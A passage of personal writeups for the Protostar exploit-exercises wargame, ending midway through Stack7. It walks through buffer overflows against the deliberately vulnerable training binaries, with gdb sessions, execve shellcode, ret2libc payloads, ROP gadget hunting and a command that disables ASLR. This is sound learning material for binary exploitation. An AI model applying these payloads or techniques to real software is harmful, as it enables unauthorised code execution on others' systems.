---
layout: project_single
title:  "Protostar"
slug: "protostar"
---
#protostar writeups

NOTE: write ups in progress!

# INDEX

| Challenge                        |
| :------------------------------- | 
| [Stack0](#stack0) | 
|[Stack1](#stack1)|
|[Stack2](#stack2)|
|[Stack3](#stack3)|
|[Stack4](#stack4)|
|[Stack5](#stack5)|
|[Stack6](#stack6)|
|[Stack7](#stack7)|
|[Format0](#format0)|
|[Format1](#format1)|
|[Format2](#format2)|
|[heap0](#heap0)|
|[heap1](#heap1)|
|[heap2](#heap2)|
|[net0](#net0)|
|[net1](#net1)|
|[net2](#net2)|
|[final0](#final0)|
|[final1](#final1)|

# Stack0

### Source Code:

```c
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

### Stack:

```bash
| eip | ebp | modified(0) |   buffer    |
```

### The plan:

fill buffer with gets 
since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified

### winning command:

```bash
python -c "print 'a'*64+'1'" | ./stack0
```

### Python exploit:

```python
from subprocess import Popen, PIPE
################
buffer = 64 
fill = "A"*buffer  
input=fill+"1"      
#################
cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]   
```

# Stack1

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### Stack:

```bash
| eip | ebp | modified(0) |   buffer    |
```

### Plan:

This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 

### winning command:

```bash
./stack1 $(python -c "print 'a'*64+'dcba'")
```

### Python exploit:

```python
from subprocess import Popen, PIPE
################
buffer = 64
fill = "A"*buffer
input=fill+'\x64\x63\x62\x61'
#################
cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```


# Stack2
---------------------------------------

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Stack:
```bash
| eip | ebp | modified(0) |   buffer    | variable pointer|
```

### Plan:
Use an environment variable to overflow buffer via strcpy and fill modified with correct value.

### winning command:

```bash

```

### Python exploit:

```python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x0a\x0d\x0a\x0d'
print(input)
os.environ ["GREENIE"]=input
#################
cproc = Popen("./stack2", stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```





# Stack3

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Stack:

```bash
| eip | ebp | fp(0) |   buffer  |
```

### Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. There are a few ways to accomplish this, so I will cover two.
#### Objdump
run the following to generate your assembly:

```bash
objdump -d ./stack2 | ./stack2.s
```

after reviewing your assembly, you can see the following

```nasm
08048424 <win>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 ec 18             	sub    $0x18,%esp
 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret   
```

#### gdb
use the following command in gdb to print the memory location of win

```
x win
```

we now know win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
### winning command:

```bash
python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
```

###Python exploit:

```python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x24\x84\x04\x08' #08048424
print(input)
#################
cproc = Popen("./stack3", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]
```




# Stack4

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Stack:

```bash
| eip | ebp |   buffer  |
```

### Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function, then we want to overwrite EIP so that we return to win.
First we find where we need to jump with gdb.

```bash
$ gdb ./stack4
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Reading symbols from ./stack4...done.
(gdb) x win
0x80483f4 <win>:        0x83e58955
```

By looking at the source code, you might assume that we simply need to fill buffer(64bytes), which will then overflow into EBP(4bytes) and then the next bytes of our input would overwrite EIP. We could try something like this

```bash
python -c "print (68*'a')+'\xf4\x83\x04\x08'" | ./stack4
```

This does not work, and it's because (as the hint says) compilers behavior isnt always apparent.
So lets fire up GDB

```bash
$ gdb ./stack4
Reading symbols from ./stack4...done.
(gdb) disas main   
Dump of assembler code for function main:
   0x08048408 <+0>:     push   %ebp
   0x08048409 <+1>:     mov    %esp,%ebp
   0x0804840b <+3>:     and    $0xfffffff0,%esp
   0x0804840e <+6>:     sub    $0x50,%esp
   0x08048411 <+9>:     lea    0x10(%esp),%eax
   0x08048415 <+13>:    mov    %eax,(%esp)
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave                                  #<--- set a break here, right after gets loads buffer with data
   0x0804841e <+22>:    ret    
End of assembler dump.
(gdb) b *0x0804841d                                           #set breakpoint 
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) run
Starting program: /home/ubuntu/workspace/proto/stack4 
aaaaaaaaaaaaaaaaaaaaaaaaaaa                                   #run with some garbage data

Breakpoint 1, main (argc=1, argv=0xffffd1c4) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
(gdb) x/40wx $esp                                              #lets check out our stack 
0xffffd0d0:     0xffffd0e0      0xffffd0fe      0xf7e25bf8      0xf7e4c273
0xffffd0e0:     0x61616161      0x61616161      0x61616161      0x61616161 #<--- we can see our input starts here
0xffffd0f0:     0x61616161      0x61616161      0x00616161      0x08048449
0xffffd100:     0x08048430      0x08048340      0x00000000      0xf7e4c42d
0xffffd110:     0xf7fc33c4      0xf7ffd000      0x0804843b      0xf7fc3000
0xffffd120:     0x08048430      0x00000000      0x00000000      0xf7e32a83  #<--- EIP
0xffffd130:     0x00000001      0xffffd1c4      0xffffd1cc      0xf7feacea
0xffffd140:     0x00000001      0xffffd1c4      0xffffd164      0x08049600
0xffffd150:     0x08048218      0xf7fc3000      0x00000000      0x00000000
0xffffd160:     0x00000000      0xebc5d5ee      0xd23331fe      0x00000000
(gdb) p $ebp                                                   #find where EBP is, since EIP is right next to this
$1 = (void *) 0xffffd128
(gdb) p 0xffffd12c - 0xffffd0e0                                #get the offset by subtracting start of input from EIP location                                                                                                                                                          
$2 = 76                            
(gdb) 
```

Now we know the offset is actually 76 so we can craft an input and test

```bash
$ python -c "print 'a'*76+'aaaa'" | ./stack4                                                                                                            
Segmentation fault
```

Good sign! Now we replace 'aaaa' with our target location(win) which was at 080483f4.

```bash
$ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
```

We could probably get rid of the segfault but we wont worry about that now

### winning command:

```bash
python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
```

### Python exploit:  (BROKEN, need to figure out why popen isnt working)

```python
from subprocess import Popen, PIPE
import os
################
input=(0x4c*'a')+'\xf4\x83\x04\x08'

print(input)
#################

cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)
```

## Stack5

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Stack:

```bash
| eip | ebp |  buffer    |
```

### Plan:
Simple overflow, but this time we need to get some shellcode to run. 

Objectives:
-figure out where input starts in memory
-determine EIP location to overwrite 
-craft input that fills memory with shellcode and overwrites EIP so that our program returns to the shellcode location and executes.

NOTES: this is the first exercise where ASLR will mess up your exploit because every time the program executes, the location that your shellcode sits in memory will change. Use the following command:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Next, fire up GDB

```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ disas main
```
```nasm
Dump of assembler code for function main:
   0x080483c4 <+0>:     push   %ebp
   0x080483c5 <+1>:     mov    %esp,%ebp
   0x080483c7 <+3>:     and    $0xfffffff0,%esp
   0x080483ca <+6>:     sub    $0x50,%esp
   0x080483cd <+9>:     lea    0x10(%esp),%eax
   0x080483d1 <+13>:    mov    %eax,(%esp)
   0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:    leave  
   0x080483da <+22>:    ret    
End of assembler dump.
```
```bash
gdb$ b *0x080483d9                                                              #break right after gets
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run
Starting program: /home/ubuntu/exploit-exercises-pwntools/protostar/stack5 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                     #give some input

Breakpoint 1, main (argc=0x1, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x61616161      0x61616161      0x61616161      0x61616161    #< we see where the input begins
0xffffd5f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd600:     0x61616161      0x61616161      0x00616161      0xf7e4a19d
0xffffd610:     0xf7fbe3c4      0xf7ffd000      0x080483fb      0xf7fbe000
0xffffd620:     0x080483f0      0x00000000      0x00000000      0xf7e30ad3
0xffffd630:     0x00000001      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x91b2c852      0xa80b8c42      0x00000000
gdb$ p $ebp
$1 = (void *) 0xffffd628                                                    #get ebp and add 4 to get EIP
gdb$ p $1+4
$2 = (void *) 0xffffd62c
gdb$ p $2 - 0xffffd5e0                                                      #subtract the mem location where our input starts
$3 = (void *) 0x4c                                                          #from EIP location to get our offset  (0x4c)
gdb$ 
```

So now we have our locations and our offset. Time to craft an input. I used http://shell-storm.org/shellcode/ to find some shellcode to use. I settled on http://shell-storm.org/shellcode/files/shellcode-811.php for this example, which is a basic 28byte execve(bin/sh) command. 


For our input, we'll put our shellcode + filler + target return location

```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'"  > testme
```

Now we test with GDB

```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ b *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run < testme 
Breakpoint 1, main (argc=0x0, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e   #shell code is in place
0xffffd5f0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
0xffffd600:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd610:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd620:     0x61616161      0x61616161      0x61616161      0xffffd5e0   #return looks good
0xffffd630:     0x00000000      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0xd40c28cd      0xedb56cdd      0x00000000

gdb$ c
Continuing.
process 31143 is executing new program: /bin/dash                           #boom
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80483d9

```

Great! So our exploit works in GDB, lets try it outside of the debugger--

```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
Illegal instruction (core dumped)   #not so fast!
``` 

So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB (guessing due to env variables, a wrapper will also fix this ). 
So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
First run the following command to allow core dumps to be saved

```bash
ulimit -c unlimited 
```

Now we can get into how to examine core dumps with gdb!

```bash
$ python -c "print 'a'*76+'xxxx'" | ./stack5
Segmentation fault (core dumped)
$ gdb ./stack5 core -q
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack5...done.
[New LWP 31596]
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x78787878 in ?? ()
gdb$ x/60wx 0xffffd5e0
0xffffd5e0:     0x08048204      0xf7fbe000      0xf7fbec20      0xf7e7b506
0xffffd5f0:     0xf7fbec20      0xffffd641      0x7fffffff      0x0000000a
0xffffd600:     0x00000000      0xf7fbe000      0x00000000      0x00000000
0xffffd610:     0xffffd688      0xf7ff04c0      0xf7e7b449      0xf7fbe000
0xffffd620:     0x00000000      0x00000000      0xffffd688      0x080483d9
0xffffd630:     0xffffd640      0xffffd65e      0xf7e23c34      0xf7e49fe3
0xffffd640:     0x61616161      0x61616161      0x61616161      0x61616161 #< we can see the location changed
0xffffd650:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd660:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd670:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd680:     0x61616161      0x61616161      0x61616161      0x78787878  ##< return
0xffffd690:     0x00000000      0xffffd724      0xffffd72c      0xf7feacca
0xffffd6a0:     0x00000001      0xffffd724      0xffffd6c4      0x080495a0
0xffffd6b0:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd6c0:     0x00000000      0xa9142257      0x90ac2647      0x00000000
```
So we alter our input with the new memory locations, and come up with an input like this:

```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
```

Now for some weirdness . I was stuck for a while on this part, because if you run 

```bash
$ cat stack5sploit | ./stack5
$ 
```

We're getting our shell , but it exits immediately. After some research, I found a few solutions. Apparently shell redirection "<"
appends an EOF after redirecting payload5.
You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)

```bash
(cat stack5sploit; cat) | ./stack5
```

### winning command:

```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
(cat stack5sploit; cat) | ./stack5
```

## Stack6

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);  

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

### Stack:

```bash
| eip | ebp | int ret |char buffer[64]  |
```

### Plan:
So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route and use Return to libc.


First we need to find our offset 

```bash
l:~/workspace/proto (master) $ ulimit -s unlimited
l:~/workspace/proto (master) $ gdb ./stack6      
gdb$ disas getpath
```
```nasm
  Dump of assembler code for function getpath:
   0x08048484 <+0>:     push   ebp
   0x08048485 <+1>:     mov    ebp,esp
   0x08048487 <+3>:     sub    esp,0x68
   0x0804848a <+6>:     mov    eax,0x80485d0
   0x0804848f <+11>:    mov    DWORD PTR [esp],eax
   0x08048492 <+14>:    call   0x80483c0 <printf@plt>
   0x08048497 <+19>:    mov    eax,ds:0x8049720
   0x0804849c <+24>:    mov    DWORD PTR [esp],eax
   0x0804849f <+27>:    call   0x80483b0 <fflush@plt>
   0x080484a4 <+32>:    lea    eax,[ebp-0x4c]
   0x080484a7 <+35>:    mov    DWORD PTR [esp],eax
   0x080484aa <+38>:    call   0x8048380 <gets@plt>
   0x080484af <+43>:    mov    eax,DWORD PTR [ebp+0x4]
   0x080484b2 <+46>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b5 <+49>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484b8 <+52>:    and    eax,0xbf000000
   0x080484bd <+57>:    cmp    eax,0xbf000000
   0x080484c2 <+62>:    jne    0x80484e4 <getpath+96>
   0x080484c4 <+64>:    mov    eax,0x80485e4
   0x080484c9 <+69>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080484cc <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x080484d0 <+76>:    mov    DWORD PTR [esp],eax
   0x080484d3 <+79>:    call   0x80483c0 <printf@plt>
   0x080484d8 <+84>:    mov    DWORD PTR [esp],0x1
   0x080484df <+91>:    call   0x80483a0 <_exit@plt>
   0x080484e4 <+96>:    mov    eax,0x80485f0
   0x080484e9 <+101>:   lea    edx,[ebp-0x4c]
   0x080484ec <+104>:   mov    DWORD PTR [esp+0x4],edx
   0x080484f0 <+108>:   mov    DWORD PTR [esp],eax
   0x080484f3 <+111>:   call   0x80483c0 <printf@plt>
   0x080484f8 <+116>:   leave  
   0x080484f9 <+117>:   ret  
   End of assembler dump.
```
```bash
gdb$ b *0x080484f9 
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack6 
input path please: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa            #< --- some junk input
got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--------------------------------------------------------------------------[regs]
  EAX: 0x00000035  EBX: 0x55736000  ECX: 0x00000000  EDX: 0x55737898  o d I t S z a p c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xFFFFD128  ESP: 0xFFFFD11C  EIP: 0x080484F9
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x80484f9 <getpath+117>:     ret    
   0x80484fa <main>:    push   ebp
   0x80484fb <main+1>:  mov    ebp,esp
   0x80484fd <main+3>:  and    esp,0xfffffff0
   0x8048500 <main+6>:  call   0x8048484 <getpath>
   0x8048505 <main+11>: mov    esp,ebp
   0x8048507 <main+13>: pop    ebp
   0x8048508 <main+14>: ret    
--------------------------------------------------------------------------------

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
gdb$ p $esp
$1 = (void *) 0xffffd11c                                                    #<-- return location to overwrite
gdb$ x/40wx $esp-60
0xffffd0bc:     0x080482a1      0x55576938      0x00000000      0x000000c2
0xffffd0cc:     0x61616161      0x61616161      0x61616161      0x61616161  #<-- start of input
0xffffd0dc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd0ec:     0x61616161      0x61616161      0x00616161      0xffffd128
0xffffd0fc:     0x08048539      0x08048520      0x080483d0      0x00000000
0xffffd10c:     0x08048505      0x557363c4      0x55576000      0xffffd128
0xffffd11c:     0x08048505      0x08048520      0x00000000      0x00000000
0xffffd12c:     0x555a5a83      0x00000001      0xffffd1c4      0xffffd1cc
0xffffd13c:     0x55563cea      0x00000001      0xffffd1c4      0xffffd164
0xffffd14c:     0x08049700      0x08048258      0x55736000      0x00000000
gdb$ p $1 - 0xffffd0cc                                                      #<-- subtract for the offset
$2 = (void *) 0x50
gdb$ 

gdb$ print system                                                   #get location of system function
$1 = {<text variable, no debug info>} 0x555cc190 <system>
gdb$ print exit                                                     #get loc of exit function
$2 = {<text variable, no debug info>} 0x555bf1e0 <exit>
gdb$ find $1, +99999999999999, "/bin/sh"                            #find "/bin/sh" in memory to use as arg
0x556eca24
warning: Unable to access 16000 bytes of target memory at 0x5573ac2c, halting search.
1 pattern found.
gdb$ quit
```

So now that we have our offset, and the locations in memory we can form the following payload by setting up the stack like follows:


FILLER + SYSTEM function call + Return value for System function call+ ARG FOR SYSTEM function call
For mine, i wanted it to exit cleanly after the shell, so i made SYSTEM's return value the function call for EXIT.

```python
       #fill          #system               #exit                 #bin/sh
print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
```

Now, we need to do the same trick to keep stdin open by using  (cat payload; cat) | ./path - see below  

### winning command:

```bash
$ python -c "print 'A'*0x50+'\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'" > stack6sploit
 (cat stack6sploit; cat) | ./stack6   
```

### Python exploit:

```Python
COMING SOON
```


## Stack7

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();

}
```

### Stack:

```bash
| EIP | EBP | BUFFER |
```

### Plan:
So for this challenge, its basically the same as stack6, but strdup is called. This function allocates space on the heap and copies a string to it. Knowing this, stack7 could be solved by predicting the heap location and jumping there to execute shellcode, but I wanted to experiment with chaining ROP gadgets. I will do my best to explain the whole process so that it hopefully proves useful for someone out there trying to learn!


###Resources:

[CodeArcana ROP](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
[Exploit DB ROP guide](https://www.exploit-db.com/docs/28479.pdf)
[System Calls](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)
[Rotlogix arm exploit](http://rotlogix.com/2016/05/03/arm-exploit-exercises/)


### ROP Gadgets---- What exactly are they?
A ROP gadget is basically just the tail end of a function that ends in ret. 


EXAMPLE:


```nasm
pop $eax;
ret;
```

### What can we do with them? 
We can piece together a bunch of ROP gadgets, along with values on our stack to perform just about anything. In my example we will be executing a system call to execve with specific parameters in order to get a shell. After we design our stack with the proper values and rop gadgets, we will be getting a shell via execve.


First things first, we will find our offset and what input we need to overwrite our EIP so that we can jump to a location in memory.
Luckily, stack7 is nearly identical to stack6, so we can take the offset from there ( See stack6 write up for walkthrough!)
So we have our offset(0x50). Now it's time to formulate a plan and design our stack.


So, our goal is to creat a system call to execve(x,y,z). 


Recommended reading: https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm 


We see that during a system call, EAX is set to a specific value and then INT 0x80(interrupt) to call the kernel. 
So we need to figure out what value we need to load into EAX for execve.


Notice in the source code, we have 

```c
#include <unistd.h>
```

unistd.h is the header file that provides access to the OS API. This means we can examine this header file, and figure out
what value will get us EXECVE.


I got snagged here for a bit. I did these challenges on a 64 bit system, so I had a couple of unistd.h's .

```
/usr/include/unistd.h
/usr/include/asm/unistd.h
/usr/include/asm/unistd_64.h
/usr/include/asm/unistd_x32.h
/usr/include/asm/unistd_32.h
```

The others check your architecture and point you to correct header, and since our program was compiled for x86, we actually use the following header file:
/usr/include/asm/unistd_32.h

```bash
le91688:/usr/include/asm $ cat unistd_32.h | grep "execve"
#define __NR_execve 11
```

So we see that 11 or 0xb is our value we want EAX to be when we call our interrupt.  Now that we have our system call figured out, we need to figure out what parameters to pass to it, and what registers to use.


### Recommended Reading:
[Demistifying execve](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html)


Lets check out EXECVE by looking at the man page:

```bash
le91688:$ man execve
EXECVE(2)                                             Linux Programmer's Manual                  EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

#### filename
The first arg needs to be a pointer to a string that is a path to the binary 
in our case, a ptr to "/bin/sh"
#### argv[]
The second is the list of args to the program, and since we are not running /bin/sh with any args, we can set this to a null byte
#### envp[]
the third arg is for environment options, again we'll set this to a null byte
Our call should look like this:

```c
execve('/bin/sh',0,0)
```

So now we know how we need to call execve, now we need to figure out how to do it.


To perform our system call we do the following:
* Put the system call number in the EAX register.
* Store the arguments to the system call in the registers EBX, ECX, etc.


This means we need our registers set up like this

```nasm
EAX = 0xb (sys call value for execve)
EBX = ptr to "/bin/sh"
ECX = 0x0
EDX = 0x0
```

Now we need to go gather some gadgets to make the magic happen. 
I used ROPgadget, you can grab it [here](https://github.com/JonathanSalwan/ROPgadget).

NOTE: i realize i'm not using this tool to its fullest potential, but I will show how I was able to grab gadgets, if you have any tips feel free to comment!  I also saw the --ROPchain switch, but thats no fun ;)


At first, I tried running ROPgadget on the binary ( ./stack7) itself, and only found ~70 gadgets, but nothing useful.  After some professional help (thanks @rotlogix) , I learned that you need to run it on the library itself.
We need to find what library is being loaded in memory at runtime:

```bash
le91688:~/workspace/proto (master) $ gdb ./stack7
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
gdb$ info sharedlibrary                                             #<<---- get loaded library info
From        To          Syms Read   Shared Object Library
0x55555860  0x5556d76c  Yes (*)     /lib/ld-linux.so.2
0x555a5490  0x556d699e  Yes (*)     /lib/i386-linux-gnu/libc.so.6   #<<------ target library to grab gadgets!
gdb$ quit
```

So now we can run ROPgadget on libc.so.6 and pipe it to a file "LIBCgadgets" I will then grep this for gadgets!

```bash
le91688:~/workspace/proto$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > ./LIBCgadgets
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
0x0007a1fb : test eax, eax ; jne 0x7a1f6 ; xor eax, eax ; ret
0x00094908 : test eax, eax ; jne 0x94986 ; xor eax, eax ; ret
0x00094937 : test eax, eax ; jne 0x949a6 ; xor eax, eax ; ret
0x0002f4d3 : test ecx, ecx ; je 0x2f4ce ; xor eax, eax ; ret
0x000949bd : xor bl, al ; nop ; xor eax, eax ; ret
0x001466dc : xor byte ptr [edx], al ; add byte ptr [eax], al ; xor eax, eax ; ret
0x0002f0ec : xor eax, eax ; ret
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
```

Using this i'm able to find the following useful gadgets:

```nasm
0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX
0x00001aa2  : pop edx ; ret                 #load value in EDX
0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX
0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX
0x0002e725  : int 0x80                      #syscall
```

Now, the memory values for each gadget are the offset within the loaded library, so we need to get the base address of the library when its loaded.


Warning: GDB info sharedlibrary is not a good way to do this and will lead to anger and hatred. Please dont ask me how i know. Instead use the following method. We will also grab the location of "bin/sh" in memory, as done in stack6.

```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited  <--- DONT FORGET THIS, DISABLE LIBRARY RANDOMIZATION
le91688:~/workspace/proto (master) $ gdb ./stack7
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
warning: Source file is more recent than executable.
28        getpath();
gdb$ p system
$1 = {<text variable, no debug info>} 0x555ce310 <system>
gdb$ find $1, +99999999999, "/bin/sh"
0x556ee84c                                                    <------------- BIN/SH location!
warning: Unable to access 16000 bytes of target memory at 0x5573ca54, halting search.
1 pattern found.
gdb$ shell
le91688:~/workspace/proto$ ps -aux | grep stack7
ubuntu     29655  0.1  0.0  47856 18112 pts/5    S    13:12   0:00 gdb ./stack7
